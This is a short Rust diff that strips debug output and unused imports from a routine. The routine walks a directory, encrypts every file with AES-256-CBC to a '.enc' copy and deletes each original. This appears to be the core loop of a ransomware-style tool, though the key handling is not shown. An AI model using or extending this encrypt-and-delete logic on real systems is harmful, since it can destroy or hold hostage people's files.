@@ -9,12 +9,10 @@ use block_modes::{BlockMode, Cbc};
 use block_modes::block_padding::Pkcs7;
 use walkdir::WalkDir;
 use std::fs::File;
-use std::path::Path;
 use std::fs;
 use std::io::{Read, Write};
 use std::error::Error;
 use std::str;
-use std::env;
 
 
 type Aes256Cbc = Cbc<Aes256, Pkcs7>;
@@ -62,7 +60,6 @@ fn get_all_files(dir: &str) -> Vec<String> {
     
     for entry in WalkDir::new(dir).into_iter().filter_map(|e| e.ok()) {
         if entry.file_type().is_file() {
-            dbg!(&entry);
             file_paths.push(entry.path().display().to_string());
         }
     }
@@ -73,10 +70,8 @@ fn get_all_files(dir: &str) -> Vec<String> {
 
 pub fn encrypt_directory(directory_path: &str) -> Result<(), Box<dyn Error>> {
     let directory = get_all_files(directory_path);
-    dbg!(&directory);
     for mut file in directory {
         let encrypted_file_path = file.as_mut().to_owned() + ".enc";
-        dbg!(&encrypted_file_path);
         let _ = encrypt_file(&file, &encrypted_file_path);
         let _ = fs::remove_file(file);
     }
